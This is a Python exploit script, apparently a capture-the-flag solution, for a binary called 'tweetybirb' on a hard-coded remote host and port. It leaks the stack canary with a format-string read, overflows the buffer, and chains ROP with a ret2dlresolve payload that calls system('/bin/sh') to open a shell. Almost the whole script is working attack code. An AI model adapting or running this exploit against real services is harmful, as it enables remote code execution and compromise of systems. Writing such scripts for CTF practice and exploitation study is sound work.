#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./tweetybirb')

host = args.HOST or '143.198.184.186'
port = int(args.PORT or 5002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
R=Rootkit(io)

bss = exe.bss(0x900 - 8)
ret2dl = Ret2dlresolvePayload(exe, "system", ["/bin/sh"], bss)
rop = ROP(exe)
rop.raw(rop.ret.address)
rop.gets(bss)
rop.ret2dlresolve(ret2dl)



payload=Ret2DLResolve()
sl("%15$p")
rl()
c=int(reu(b"\n"), 16)
info(f"canary : {hex(c)}")
re()
sl(b"A"*72 + p(c) + p(0xdeadbeef) + rop.chain() + b"\n" + ret2dl.payload)
# print(rl())
io.interactive()

